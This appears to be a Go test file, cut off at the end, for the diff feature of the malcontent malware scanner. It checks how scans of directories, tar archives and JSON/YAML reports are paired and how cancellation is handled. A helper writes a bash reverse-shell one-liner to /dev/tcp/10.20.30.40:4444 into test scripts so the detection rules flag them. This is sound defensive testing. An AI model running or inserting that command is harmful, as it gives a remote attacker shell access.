// Copyright 2026 Chainguard, Inc.
// SPDX-License-Identifier: Apache-2.0

package action

import (
	"archive/tar"
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/json"
	"errors"
	"io/fs"
	"maps"
	"path/filepath"
	"runtime"
	"slices"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"testing"

	"github.com/chainguard-dev/malcontent/pkg/file"
	"github.com/chainguard-dev/malcontent/pkg/malcontent"
	"github.com/chainguard-dev/malcontent/pkg/render"
	"github.com/chainguard-dev/malcontent/rules"
	thirdparty "github.com/chainguard-dev/malcontent/third_party"
	"github.com/puzpuzpuz/xsync/v4"

	yarax "github.com/VirusTotal/yara-x/go"
)

// diffTestConfig returns a Config backed by the bundled rules. Scans must use
// these rules: the package-wide scanner pool binds to the first rule set it sees.
func diffTestConfig(t *testing.T) malcontent.Config {
	t.Helper()
	yrs, err := CachedRules(t.Context(), []fs.FS{rules.FS, thirdparty.FS})
	if err != nil {
		t.Fatalf("CachedRules: %v", err)
	}
	return malcontent.Config{Concurrency: 2, Rules: yrs}
}

// diffTestShellPayload returns a script the bundled rules flag. The network
// path is assembled at run time so the test binary does not embed the one-liner.
func diffTestShellPayload(label string) string {
	target := strings.Join([]string{"/dev", "tcp", "10.20.30.40", "4444"}, "/")
	return "#!/bin/bash\n# " + label + "\nbash -i >& " + target + " 0>&1\n"
}

func diffTestWriteTar(t *testing.T, path string, entries map[string]string) {
	t.Helper()
	var buf bytes.Buffer
	tw := tar.NewWriter(&buf)
	for _, name := range slices.Sorted(maps.Keys(entries)) {
		body := entries[name]
		hdr := &tar.Header{Name: name, Mode: 0o755, Size: int64(len(body)), Typeflag: tar.TypeReg}
		if err := tw.WriteHeader(hdr); err != nil {
			t.Fatalf("WriteHeader(%q): %v", name, err)
		}
		if _, err := tw.Write([]byte(body)); err != nil {
			t.Fatalf("Write(%q): %v", name, err)
		}
	}
	if err := tw.Close(); err != nil {
		t.Fatalf("tar Close: %v", err)
	}
	diffTestWriteFile(t, path, buf.String())
}

func diffTestWriteReport(t *testing.T, path string, frs map[string]*malcontent.FileReport) {
	t.Helper()
	data, err := json.Marshal(malcontent.ScanResult{FileReports: frs})
	if err != nil {
		t.Fatalf("json.Marshal: %v", err)
	}
	diffTestWriteFile(t, path, string(data))
}

func TestRelFileReport(t *testing.T) {
	t.Parallel()
	root := diffTestTempDir(t)
	dir := filepath.Join(root, "scan")
	single := filepath.Join(dir, "a.sh")
	diffTestWriteFile(t, single, "#!/bin/sh\necho a\n")
	diffTestWriteFile(t, filepath.Join(dir, "sub", "b.sh"), "#!/bin/sh\necho b\n")
	diffTestWriteFile(t, filepath.Join(dir, "empty.sh"), "")
	archivePath := filepath.Join(root, "pkg.tar")
	diffTestWriteTar(t, archivePath, map[string]string{
		"bin/flagged.sh": diffTestShellPayload("flagged"),
		"bin/plain.sh":   "#!/bin/sh\necho plain\n",
	})

	tests := []struct {
		name      string
		from      string
		isArchive bool
		wantKeys  []string
		wantBase  string
	}{
		{
			name:     "directory keys files by path below it and omits skipped files",
			from:     dir,
			wantKeys: []string{"a.sh", filepath.Join("sub", "b.sh")},
			wantBase: dir,
		},
		{
			name:     "single file is keyed by its base name",
			from:     single,
			wantKeys: []string{"a.sh"},
			wantBase: single,
		},
		{
			name:      "archive keys entries by their path within it",
			from:      archivePath,
			isArchive: true,
			wantKeys:  []string{"/bin/flagged.sh", "/bin/plain.sh"},
			wantBase:  archivePath,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			got, base, err := relFileReport(t.Context(), diffTestConfig(t), tt.from, tt.isArchive)
			if err != nil {
				t.Fatalf("relFileReport: got error = %v, want nil", err)
			}
			if keys := slices.Sorted(maps.Keys(got)); !slices.Equal(keys, tt.wantKeys) {
				t.Errorf("keys: got = %q, want = %q", keys, tt.wantKeys)
			}
			if base != tt.wantBase {
				t.Errorf("base: got = %q, want = %q", base, tt.wantBase)
			}
			for rel, fr := range got {
				if fr.PreviousRelPath != rel {
					t.Errorf("PreviousRelPath for %q: got = %q, want = %q", rel, fr.PreviousRelPath, rel)
				}
			}
		})
	}
}

func TestRelFileReportErrors(t *testing.T) {
	t.Parallel()
	root := diffTestTempDir(t)
	diffTestWriteFile(t, filepath.Join(root, "a.sh"), "#!/bin/sh\necho a\n")
	canceled, cancel := context.WithCancel(t.Context())
	cancel()

	tests := []struct {
		name string
		ctx  context.Context
		from string
		want error
	}{
		{name: "canceled context", ctx: canceled, from: root, want: context.Canceled},
		{name: "path below a regular file", from: filepath.Join(root, "a.sh", "child"), want: syscall.ENOTDIR},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			ctx := tt.ctx
			if ctx == nil {
				ctx = t.Context()
			}
			got, base, err := relFileReport(ctx, diffTestConfig(t), tt.from, false)
			if !errors.Is(err, tt.want) {
				t.Fatalf("relFileReport error: got = %v, want = %v", err, tt.want)
			}
			if got != nil || base != "" {
				t.Errorf("relFileReport on error: got = (%v, %q), want = (nil, \"\")", got, base)
			}
		})
	}
}

// diffTestCancelAfter cancels itself during its nth Err call, so stepping n
// across runs makes each cancellation check in turn the first to observe it.
type diffTestCancelAfter struct {
	context.Context
	cancel context.CancelFunc
	calls  atomic.Int64
	n      int64
}

func newDiffTestCancelAfter(t *testing.T, n int64) *diffTestCancelAfter {
	t.Helper()
	ctx, cancel := context.WithCancel(t.Context())
	t.Cleanup(cancel)
	return &diffTestCancelAfter{Context: ctx, cancel: cancel, n: n}
}

func (c *diffTestCancelAfter) Err() error {
	if c.calls.Add(1) == c.n {
		c.cancel()
	}
	return c.Context.Err()
}

// canceled reports whether the nth Err call happened.
func (c *diffTestCancelAfter) canceled() bool {
	return c.Context.Err() != nil
}

// diffTestMaxCancelChecks bounds the cancellation sweeps; a small diff
// performs a few dozen checks.
const diffTestMaxCancelChecks = 500

func TestRelFileReportCancellation(t *testing.T) {
	t.Parallel()
	root := diffTestTempDir(t)
	diffTestWriteFile(t, filepath.Join(root, "a.sh"), "#!/bin/sh\necho a\n")
	diffTestWriteFile(t, filepath.Join(root, "b.sh"), "#!/bin/sh\necho b\n")
	c := diffTestConfig(t)

	for n := int64(1); n <= diffTestMaxCancelChecks; n++ {
		ctx := newDiffTestCancelAfter(t, n)
		got, base, err := relFileReport(ctx, c, root, false)
		if !ctx.canceled() {
			if err != nil {
				t.Fatalf("relFileReport without cancellation: got error = %v, want nil", err)
			}
			if keys := slices.Sorted(maps.Keys(got)); !slices.Equal(keys, []string{"a.sh", "b.sh"}) {
				t.Errorf("keys without cancellation: got = %q, want = [a.sh b.sh]", keys)
			}
			return
		}
		if !errors.Is(err, context.Canceled) || got != nil || base != "" {
			t.Fatalf("relFileReport canceled at check %d: got = (%d entries, %q, %v), want = (nil, \"\", %v)", n, len(got), base, err, context.Canceled)
		}
	}
	t.Fatalf("relFileReport: still canceled after %d checks, want a complete run", diffTestMaxCancelChecks)
}

func TestDiffCancellation(t *testing.T) {
	t.Parallel()
	root := diffTestTempDir(t)
	srcDir, destDir := filepath.Join(root, "src"), filepath.Join(root, "dest")
	diffTestWriteFile(t, filepath.Join(srcDir, "same.sh"), "#!/bin/sh\necho same\n")
	diffTestWriteFile(t, filepath.Join(srcDir, "gone.sh"), "#!/bin/sh\necho gone\n")
	diffTestWriteFile(t, filepath.Join(destDir, "same.sh"), "#!/bin/sh\necho same again\n")
	diffTestWriteFile(t, filepath.Join(destDir, "new.sh"), "#!/bin/sh\necho new\n")
	c := diffTestConfig(t)
	c.ScanPaths = []string{srcDir, destDir}

	for n := int64(1); n <= diffTestMaxCancelChecks; n++ {
		ctx := newDiffTestCancelAfter(t, n)
		res, err := Diff(ctx, c, nil)
		if !ctx.canceled() {
			if err != nil {
				t.Fatalf("Diff without cancellation: got error = %v, want nil", err)
			}
			if res == nil || res.Diff == nil {
				t.Fatalf("Diff without cancellation: got = %v, want a report with a diff", res)
			}
			counts := []int{res.Diff.Removed.Len(), res.Diff.Added.Len(), res.Diff.Modified.Len()}
			if !slices.Equal(counts, []int{1, 1, 1}) {
				t.Errorf("removed, added, modified counts without cancellation: got = %v, want = [1 1 1]", counts)
			}
			return
		}
		if !errors.Is(err, context.Canceled) || res != nil {
			t.Fatalf("Diff canceled at check %d: got = (%v, %v), want = (nil, %v)", n, res, err, context.Canceled)
		}
	}
	t.Fatalf("Diff: still canceled after %d checks, want a complete run", diffTestMaxCancelChecks)
}

// diffTestRenderer records the renderer calls made while diffing.
type diffTestRenderer struct {
	mu       sync.Mutex
	scanning []string
	files    []string
}

var _ malcontent.Renderer = (*diffTestRenderer)(nil)

func (r *diffTestRenderer) Scanning(_ context.Context, path string) {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.scanning = append(r.scanning, path)
}

func (r *diffTestRenderer) File(_ context.Context, fr *malcontent.FileReport) error {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.files = append(r.files, fr.Path)
	return nil
}

func (r *diffTestRenderer) Full(context.Context, *malcontent.Config, *malcontent.Report) error {
	return nil
}

func (r *diffTestRenderer) Name() string {
	return "diff-test"
}

func TestDiffLeavesRenderingToTheCaller(t *testing.T) {
	t.Parallel()
	root := diffTestTempDir(t)
	srcDir, destDir := filepath.Join(root, "src"), filepath.Join(root, "dest")
	diffTestWriteFile(t, filepath.Join(srcDir, "tool.sh"), diffTestShellPayload("tool"))
	diffTestWriteFile(t, filepath.Join(destDir, "tool.sh"), diffTestShellPayload("tool v2"))
	rec := &diffTestRenderer{}
	c := diffTestConfig(t)
	c.Renderer = rec

	d := diffTestRun(t, c, srcDir, destDir)
	if got := diffTestKeys(d.Modified); len(got) != 1 {
		t.Errorf("Modified keys: got = %q, want one entry", got)
	}
	// The caller renders the finished diff; the scans behind it must not
	// render per-file progress or results.
	rec.mu.Lock()
	defer rec.mu.Unlock()
	if len(rec.scanning) != 0 || len(rec.files) != 0 {
		t.Errorf("renderer calls during the diff: got = Scanning %q, File %q, want none", rec.scanning, rec.files)
	}
}

func TestDiffDirectories(t *testing.T) {
	t.Parallel()
	root := diffTestTempDir(t)
	srcDir, destDir := filepath.Join(root, "src"), filepath.Join(root, "dest")
	diffTestWriteFile(t, filepath.Join(srcDir, "same.sh"), "#!/bin/sh\necho same\n")
	diffTestWriteFile(t, filepath.Join(srcDir, "gone.sh"), "#!/bin/sh\necho gone\n")
	diffTestWriteFile(t, filepath.Join(srcDir, "empty.sh"), "")
	diffTestWriteFile(t, filepath.Join(destDir, "same.sh"), "#!/bin/sh\necho same again\n")
	diffTestWriteFile(t, filepath.Join(destDir, "new.sh"), "#!/bin/sh\necho new\n")
	diffTestWriteFile(t, filepath.Join(destDir, "empty.sh"), "")

	c := diffTestConfig(t)
	c.ScanPaths = []string{srcDir, destDir}
	res, err := Diff(t.Context(), c, nil)
	if err != nil {
		t.Fatalf("Diff: got error = %v, want nil", err)
	}
	if res == nil || res.Diff == nil {
		t.Fatalf("Diff: got = %v, want a report with a diff", res)
	}
	d := res.Diff

	key := func(dir, name string) string { return dir + " ∴ " + filepath.Join(dir, name) }
	sections := []struct {
		name string
		got  []string
		want []string
	}{
		{name: "Removed", got: diffTestKeys(d.Removed), want: []string{key(srcDir, "gone.sh")}},
		{name: "Added", got: diffTestKeys(d.Added), want: []string{key(destDir, "new.sh")}},
		{name: "Modified", got: diffTestKeys(d.Modified), want: []string{key(destDir, "same.sh")}},
	}
	for _, s := range sections {
		if !slices.Equal(s.got, s.want) {
			t.Errorf("%s keys: got = %q, want = %q", s.name, s.got, s.want)
		}
	}

	mod, ok := d.Modified.Get(key(destDir, "same.sh"))
	if !ok {
		t.Fatalf("Modified: got no entry for same.sh, want one")
	}
	if want := filepath.Join(destDir, "same.sh"); mod.Path != want {
		t.Errorf("Path: got = %q, want = %q", mod.Path, want)
	}
	if mod.PreviousRelPath != "same.sh" {
		t.Errorf("PreviousRelPath: got = %q, want = %q", mod.PreviousRelPath, "same.sh")
	}
	if mod.PreviousPath != "" {
		t.Errorf("PreviousPath: got = %q, want empty", mod.PreviousPath)
	}
}

func TestDiffFiles(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name        string
		setup       func(t *testing.T, root string) (string, string)
		wantChanged bool
		wantPrevRel string
	}{
		{
			name: "two files compare one to one",
			setup: func(t *testing.T, root string) (string, string) {
				t.Helper()
				src, dest := filepath.Join(root, "a", "old.sh"), filepath.Join(root, "b", "new.sh")
				diffTestWriteFile(t, src, "#!/bin/sh\necho old\n")
				diffTestWriteFile(t, dest, "#!/bin/sh\necho new\n")
				return src, dest
			},
			wantChanged: true,
			wantPrevRel: "old.sh",
		},
		{
			name: "archive and file compare one to one without archive formatting",
			setup: func(t *testing.T, root string) (string, string) {
				t.Helper()
				srcArchive, dest := filepath.Join(root, "src", "pkg.tar"), filepath.Join(root, "tool.sh")
				diffTestWriteTar(t, srcArchive, map[string]string{"bin/tool.sh": diffTestShellPayload("tool")})
				diffTestWriteFile(t, dest, diffTestShellPayload("tool"))
				return srcArchive, dest
			},
			wantChanged: true,
		},
		{
			name: "empty source file yields no modification",
			setup: func(t *testing.T, root string) (string, string) {
				t.Helper()
				src, dest := filepath.Join(root, "empty.sh"), filepath.Join(root, "new.sh")
				diffTestWriteFile(t, src, "")
				diffTestWriteFile(t, dest, "#!/bin/sh\necho new\n")
				return src, dest
			},
			wantChanged: false,
		},
		{
			name: "empty destination file yields no modification",
			setup: func(t *testing.T, root string) (string, string) {
				t.Helper()
				src, dest := filepath.Join(root, "old.sh"), filepath.Join(root, "empty.sh")
				diffTestWriteFile(t, src, "#!/bin/sh\necho old\n")
				diffTestWriteFile(t, dest, "")
				return src, dest
			},
			wantChanged: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			src, dest := tt.setup(t, diffTestTempDir(t))
			c := diffTestConfig(t)
			c.ScanPaths = []string{src, dest}
			res, err := Diff(t.Context(), c, nil)
			if err != nil {
				t.Fatalf("Diff: got error = %v, want nil", err)
			}
			if res == nil || res.Diff == nil {
				t.Fatalf("Diff: got = %v, want a report with a diff", res)
			}
			d := res.Diff
			if n := d.Added.Len() + d.Removed.Len(); n != 0 {
				t.Errorf("added and removed entries: got = %d (%q, %q), want = 0", n, diffTestKeys(d.Added), diffTestKeys(d.Removed))
			}

			var want []string
			if tt.wantChanged {
				want = []string{dest + " ∴ " + dest}
			}
			if got := diffTestKeys(d.Modified); !slices.Equal(got, want) {
				t.Fatalf("Modified keys: got = %q, want = %q", got, want)
			}
			if !tt.wantChanged {
				return
			}
			mod, _ := d.Modified.Get(want[0])
			if mod.Path != dest {
				t.Errorf("Path: got = %q, want = %q", mod.Path, dest)
			}
			if tt.wantPrevRel != "" && mod.PreviousRelPath != tt.wantPrevRel {
				t.Errorf("PreviousRelPath: got = %q, want = %q", mod.PreviousRelPath, tt.wantPrevRel)
			}
		})
	}
}

// diffTestRun diffs src against dest and returns the diff report.
func diffTestRun(t *testing.T, c malcontent.Config, src, dest string) *malcontent.DiffReport {
	t.Helper()
	c.ScanPaths = []string{src, dest}
	res, err := Diff(t.Context(), c, nil)
	if err != nil {
		t.Fatalf("Diff: got error = %v, want nil", err)
	}
	if res == nil || res.Diff == nil {
		t.Fatalf("Diff: got = %v, want a report with a diff", res)
	}
	return res.Diff
}

// diffTestAssertKeys compares each section's keys, in order, with the wanted keys.
func diffTestAssertKeys(t *testing.T, d *malcontent.DiffReport, removed, added, modified []string) {
	t.Helper()
	sections := []struct {
		name string
		got  []string
		want []string
	}{
		{name: "Removed", got: diffTestKeys(d.Removed), want: removed},
		{name: "Added", got: diffTestKeys(d.Added), want: added},
		{name: "Modified", got: diffTestKeys(d.Modified), want: modified},
	}
	for _, s := range sections {
		if !slices.Equal(s.got, s.want) {
			t.Errorf("%s keys: got = %q, want = %q", s.name, s.got, s.want)
		}
	}
}

func TestDiffArchives(t *testing.T) {
	t.Parallel()
	root := diffTestTempDir(t)
	// Differently named archives, and entries that are flagged on only one
	// side, still pair by their path within the archive.
	srcArchive := filepath.Join(root, "src", "pkg-1.0.tar")
	destArchive := filepath.Join(root, "dest", "pkg-1.1.tar")
	diffTestWriteTar(t, srcArchive, map[string]string{
		"bin/tool.sh":    diffTestShellPayload("tool"),
		"bin/old.sh":     diffTestShellPayload("old"),
		"bin/cleaned.sh": diffTestShellPayload("cleaned"),
		"etc/plain.sh":   "#!/bin/sh\necho plain\n",
	})
	diffTestWriteTar(t, destArchive, map[string]string{
		"bin/tool.sh":    diffTestShellPayload("tool"),
		"bin/new.sh":     diffTestShellPayload("new"),
		"bin/cleaned.sh": "#!/bin/sh\necho cleaned\n",
		"etc/plain.sh":   "#!/bin/sh\necho plain again\n",
	})

	d := diffTestRun(t, diffTestConfig(t), srcArchive, destArchive)
	diffTestAssertKeys(t, d,
		[]string{srcArchive + " ∴ /bin/old.sh"},
		[]string{destArchive + " ∴ /bin/new.sh"},
		[]string{destArchive + " ∴ /bin/cleaned.sh", destArchive + " ∴ /bin/tool.sh", destArchive + " ∴ /etc/plain.sh"},
	)
	for pair := d.Modified.Oldest(); pair != nil; pair = pair.Next() {
		if pair.Value.Path != pair.Key {
			t.Errorf("Modified Path: got = %q, want = %q", pair.Value.Path, pair.Key)
		}
		if pair.Value.PreviousPath != "" {
			t.Errorf("Modified PreviousPath for %q: got = %q, want empty", pair.Key, pair.Value.PreviousPath)
		}
	}
}

func TestDiffArchivesWithSymlinkedTempDir(t *testing.T) {
	// Not parallel: points TMPDIR through a symlink, so each archive's
	// extraction root and the paths scanned below it are spelled differently.
	c := diffTestConfig(t)
	root := diffTestTempDir(t)
	srcArchive := filepath.Join(root, "src", "pkg-1.0.tar")
	destArchive := filepath.Join(root, "dest", "pkg-1.1.tar")
	// Flagged entries carry their extraction root while unflagged entries
	// carry only a display path; both must pair, including an entry that is
	// flagged on one side only.
	diffTestWriteTar(t, srcArchive, map[string]string{
		"bin/tool.sh":    diffTestShellPayload("tool"),
		"bin/old.sh":     diffTestShellPayload("old"),
		"bin/cleaned.sh": diffTestShellPayload("cleaned"),
		"etc/plain.sh":   "#!/bin/sh\necho plain\n",
		"etc/gone.sh":    "#!/bin/sh\necho gone\n",
	})
	diffTestWriteTar(t, destArchive, map[string]string{
		"bin/tool.sh":    diffTestShellPayload("tool v2"),
		"bin/new.sh":     diffTestShellPayload("new"),
		"bin/cleaned.sh": "#!/bin/sh\necho cleaned\n",
		"etc/plain.sh":   "#!/bin/sh\necho plain again\n",
		"etc/fresh.sh":   "#!/bin/sh\necho fresh\n",
	})
	tmpReal, tmpLink := diffTestSymlinkedDir(t)
	t.Setenv("TMPDIR", tmpLink)

	d := diffTestRun(t, c, srcArchive, destArchive)
	diffTestAssertKeys(t, d,
		[]string{srcArchive + " ∴ /bin/old.sh", srcArchive + " ∴ /etc/gone.sh"},
		[]string{destArchive + " ∴ /bin/new.sh", destArchive + " ∴ /etc/fresh.sh"},
		[]string{destArchive + " ∴ /bin/cleaned.sh", destArchive + " ∴ /bin/tool.sh", destArchive + " ∴ /etc/plain.sh"},
	)
	for pair := d.Modified.Oldest(); pair != nil; pair = pair.Next() {
		if pair.Value.Path != pair.Key {
			t.Errorf("Modified Path: got = %q, want = %q", pair.Value.Path, pair.Key)
		}
	}

	entries, err := scanTestReadDir(tmpReal)
	if err != nil {
		t.Fatalf("ReadDir(%q): %v", tmpReal, err)
	}
	if len(entries) != 0 {
		t.Errorf("temporary directory after diff: got %d entries, want none", len(entries))
	}
}

func TestDiffDirectoriesWithNestedArchives(t *testing.T) {
	t.Parallel()
	// Not resolved on purpose: on macOS the scanner reports archive paths
	// through the /var symlink, while the scan root resolves to /private/var.
	root := t.TempDir()
	srcDir, destDir := filepath.Join(root, "src"), filepath.Join(root, "dest")
	diffTestWriteTar(t, filepath.Join(srcDir, "lib", "pkg.tar"), map[string]string{
		"bin/tool.sh":  diffTestShellPayload("tool"),
		"bin/other.sh": diffTestShellPayload("other"),
	})
	diffTestWriteTar(t, filepath.Join(destDir, "lib", "pkg.tar"), map[string]string{
		"bin/tool.sh":  diffTestShellPayload("tool v2"),
		"bin/other.sh": diffTestShellPayload("other v2"),
	})

	d := diffTestRun(t, diffTestConfig(t), srcDir, destDir)
	prefix := destDir + " ∴ " + filepath.Join(destDir, "lib", "pkg.tar") + " ∴ "
	diffTestAssertKeys(t, d, nil, nil, []string{prefix + "/bin/other.sh", prefix + "/bin/tool.sh"})
}

// diffTestReport returns report entries keyed by their paths, each with the
// given risk and, when ids are given, those behaviors.
func diffTestReport(risk int, ids []string, paths ...string) map[string]*malcontent.FileReport {
	frs := make(map[string]*malcontent.FileReport, len(paths))
	for _, p := range paths {
		fr := &malcontent.FileReport{Path: p, RiskScore: risk}
		for _, id := range ids {
			fr.Behaviors = append(fr.Behaviors, &malcontent.Behavior{ID: id})
		}
		frs[p] = fr
	}
	return frs
}

func TestDiffReports(t *testing.T) {
	t.Parallel()
	shell := []string{"exec/shell/command"}
	merge := func(ms ...map[string]*malcontent.FileReport) map[string]*malcontent.FileReport {
		out := map[string]*malcontent.FileReport{}
		for _, m := range ms {
			maps.Copy(out, m)
		}
		return out
	}
	tests := []struct {
		name         string
		c            malcontent.Config
		src, dest    map[string]*malcontent.FileReport
		wantRemoved  []string
		wantAdded    []string
		wantModified []string
	}{
		{
			name: "local paths reconcile by path",
			src: map[string]*malcontent.FileReport{
				"/app/same": {Path: "/app/same", RiskScore: 1, Behaviors: []*malcontent.Behavior{{ID: "net/socket/listen"}}},
				"/app/gone": {Path: "/app/gone", RiskScore: 1},
			},
			dest: map[string]*malcontent.FileReport{
				"/app/same": {Path: "/app/same", RiskScore: 3, Behaviors: []*malcontent.Behavior{{ID: "net/socket/listen"}, {ID: "exec/shell/command"}}},
				"/app/new":  {Path: "/app/new", RiskScore: 2},
			},
			wantRemoved:  []string{"/app/gone"},
			wantAdded:    []string{"/app/new"},
			wantModified: []string{"/app/same"},
		},
		{
			name: "image paths reconcile across image references",
			src: map[string]*malcontent.FileReport{
				"cgr.dev/org/img:1 ∴ /usr/bin/app": {Path: "cgr.dev/org/img:1 ∴ /usr/bin/app", RiskScore: 1},
			},
			dest: map[string]*malcontent.FileReport{
				"cgr.dev/org/img:2 ∴ /usr/bin/app": {Path: "cgr.dev/org/img:2 ∴ /usr/bin/app", RiskScore: 2},
			},
			wantModified: []string{"cgr.dev/org/img:2 ∴ /usr/bin/app"},
		},
		{
			name: "temporary extraction roots are removed before reconciling",
			src: map[string]*malcontent.FileReport{
				"/tmp/a1/b1/T/mal1/usr/bin/app": {Path: "/tmp/a1/b1/T/mal1/usr/bin/app", RiskScore: 1},
			},
			dest: map[string]*malcontent.FileReport{
				"/tmp/a2/b2/T/mal2/usr/bin/app": {Path: "/tmp/a2/b2/T/mal2/usr/bin/app", RiskScore: 2},
			},
			wantModified: []string{"/usr/bin/app"},
		},
		{
			// The renderers write an empty key, for a file named by a trim
			// prefix equal to its path, with an equally empty path.
			name: "entries with empty keys are skipped on both sides",
			src: map[string]*malcontent.FileReport{
				"":        {Path: "", RiskScore: 1},
				"/app/ok": {Path: "/app/ok", RiskScore: 1},
			},
			dest: map[string]*malcontent.FileReport{
				"":        {Path: "", RiskScore: 1},
				"/app/ok": {Path: "/app/ok", RiskScore: 2},
			},
			wantModified: []string{"/app/ok"},
		},
		{
			name: "archive members in one directory keep their archive paths",
			src: merge(diffTestReport(1, []string{"a/a/a"}, "/r/a.jar ∴ /META-INF/MANIFEST.MF"),
				diffTestReport(3, []string{"b/b/b"}, "/r/b.jar ∴ /META-INF/MANIFEST.MF")),
			dest: merge(diffTestReport(1, []string{"a/a/a"}, "/r/a.jar ∴ /META-INF/MANIFEST.MF"),
				diffTestReport(4, []string{"b/b/b", "c/c/c"}, "/r/b.jar ∴ /META-INF/MANIFEST.MF")),
			wantModified: []string{"/r/a.jar ∴ /META-INF/MANIFEST.MF", "/r/b.jar ∴ /META-INF/MANIFEST.MF"},
		},
		{
			name:         "archive members of a relative scan path keep their archive paths",
			src:          diffTestReport(1, shell, "v1/bin/app", "v1/a.tar ∴ /x", "v1/b.tar ∴ /y"),
			dest:         diffTestReport(2, shell, "v1/bin/app", "v1/a.tar ∴ /x", "v1/b.tar ∴ /y"),
			wantModified: []string{"/v1/a.tar ∴ /x", "/v1/b.tar ∴ /y", "/v1/bin/app"},
		},
		{
			name:         "archive reports pair by the path within the archive",
			src:          merge(diffTestReport(1, shell, "/s/pkg-1.0.tar ∴ /bin/tool", "/s/pkg-1.0.tar ∴ /bin/gone")),
			dest:         merge(diffTestReport(2, shell, "/s/pkg-1.1.tar ∴ /bin/tool"), diffTestReport(1, shell, "/s/pkg-1.1.tar ∴ /bin/new")),
			wantRemoved:  []string{"/s/pkg-1.0.tar ∴ /bin/gone"},
			wantAdded:    []string{"/s/pkg-1.1.tar ∴ /bin/new"},
			wantModified: []string{"/s/pkg-1.1.tar ∴ /bin/tool"},
		},
		{
			name: "image files without findings pair by their path below the temporary root",
			src: merge(diffTestReport(1, shell, "cgr.dev/org/img:1 ∴ /usr/bin/app"),
				diffTestReport(0, nil, "/tmp/a1/b1/T/mal1/usr/bin/plain")),
			dest: merge(diffTestReport(2, shell, "cgr.dev/org/img:2 ∴ /usr/bin/app"),
				diffTestReport(0, nil, "/tmp/a2/b2/T/mal2/usr/bin/plain")),
			wantModified: []string{"cgr.dev/org/img:2 ∴ /usr/bin/app", "cgr.dev/org/img:2 ∴ /usr/bin/plain"},
		},
		{
			name:         "reports from different scan roots pair by their paths below the roots",
			src:          diffTestReport(1, shell, "/build/old/bin/app", "/build/old/bin/gone"),
			dest:         merge(diffTestReport(3, shell, "/build/new/bin/app"), diffTestReport(2, shell, "/build/new/bin/new")),
			wantRemoved:  []string{"/build/old/bin/gone"},
			wantAdded:    []string{"/build/new/bin/new"},
			wantModified: []string{"/build/new/bin/app"},
		},
		{
			name:         "a different scan root that gains a top-level directory pairs below the roots",
			src:          diffTestReport(1, shell, "/build/old/bin/app", "/build/old/bin/tool"),
			dest:         diffTestReport(2, shell, "/build/new/bin/app", "/build/new/bin/tool", "/build/new/lib/new"),
			wantAdded:    []string{"/build/new/lib/new"},
			wantModified: []string{"/build/new/bin/app", "/build/new/bin/tool"},
		},
		{
			name:         "the same scan root pairs in place when a directory is added",
			src:          diffTestReport(1, shell, "/app/bin/a"),
			dest:         merge(diffTestReport(2, shell, "/app/bin/a"), diffTestReport(1, shell, "/app/lib/b")),
			wantAdded:    []string{"/app/lib/b"},
			wantModified: []string{"/app/bin/a"},
		},
		{
			name:        "unrelated reports stay apart",
			src:         diffTestReport(1, shell, "/old/a", "/old/b"),
			dest:        diffTestReport(1, shell, "/new/c", "/new/d"),
			wantRemoved: []string{"/old/a", "/old/b"},
			wantAdded:   []string{"/new/c", "/new/d"},
		},
		{
			name:         "single-file reports compare one to one",
			src:          diffTestReport(1, shell, "/build/old/app-v1"),
			dest:         diffTestReport(3, shell, "/build/new/app-v2"),
			wantModified: []string{"/build/new/app-v2"},
		},
		{
			name: "minimum file risk applies to added and removed files",
			c:    malcontent.Config{MinFileRisk: 3},
			src: merge(diffTestReport(1, shell, "/app/same", "/app/gone"),
				diffTestReport(3, shell, "/app/gone-high")),
			dest: merge(diffTestReport(2, shell, "/app/same"), diffTestReport(1, shell, "/app/new"),
				diffTestReport(3, shell, "/app/new-high")),
			wantRemoved: []string{"/app/gone-high"},
			wantAdded:   []string{"/app/new-high"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			root := diffTestTempDir(t)
			src, dest := filepath.Join(root, "src.json"), filepath.Join(root, "dest.json")
			diffTestWriteReport(t, src, tt.src)
			diffTestWriteReport(t, dest, tt.dest)

			c := tt.c
			c.Report, c.ScanPaths = true, []string{src, dest}
			res, err := Diff(t.Context(), c, nil)
			if err != nil {
				t.Fatalf("Diff: got error = %v, want nil", err)
			}
			if res == nil || res.Diff == nil {
				t.Fatalf("Diff: got = %v, want a report with a diff", res)
			}
			sections := []struct {
				name string
				got  []string
				want []string
			}{
				{name: "Removed", got: diffTestKeys(res.Diff.Removed), want: tt.wantRemoved},
				{name: "Added", got: diffTestKeys(res.Diff.Added), want: tt.wantAdded},
				{name: "Modified", got: diffTestKeys(res.Diff.Modified), want: tt.wantModified},
			}
			for _, s := range sections {
				if !slices.Equal(s.got, s.want) {
					t.Errorf("%s keys: got = %q, want = %q", s.name, s.got, s.want)
				}
			}
		})
	}
}

func TestDiffYAMLReports(t *testing.T) {
	t.Parallel()
	root := diffTestTempDir(t)
	write := func(name string, frs map[string]*malcontent.FileReport) string {
		files := xsync.NewMap[string, *malcontent.FileReport]()
		for k, fr := range frs {
			files.Store(k, fr)
		}
		var out bytes.Buffer
		r, err := render.New("yaml", &out)
		if err != nil {
			t.Fatalf("render.New: %v", err)
		}
		if err := r.Full(t.Context(), nil, &malcontent.Report{Files: files}); err != nil {
			t.Fatalf("Full: %v", err)
		}
		path := filepath.Join(root, name)
		diffTestWriteFile(t, path, out.String())
		return path
	}
	src := write("src.yaml", map[string]*malcontent.FileReport{
		"/app/same": {Path: "/app/same", RiskScore: 1, Behaviors: []*malcontent.Behavior{{ID: "net/socket/listen"}}},
		"/app/gone": {Path: "/app/gone", RiskScore: 1},
	})
	dest := write("dest.yaml", map[string]*malcontent.FileReport{
		"/app/same": {Path: "/app/same", RiskScore: 3, Behaviors: []*malcontent.Behavior{{ID: "net/socket/listen"}, {ID: "exec/shell/command"}}},
		"/app/new":  {Path: "/app/new", RiskScore: 2},
	})

	res, err := Diff(t.Context(), malcontent.Config{Report: true, ScanPaths: []string{src, dest}}, nil)
	if err != nil {
		t.Fatalf("Diff: got error = %v, want nil", err)
	}
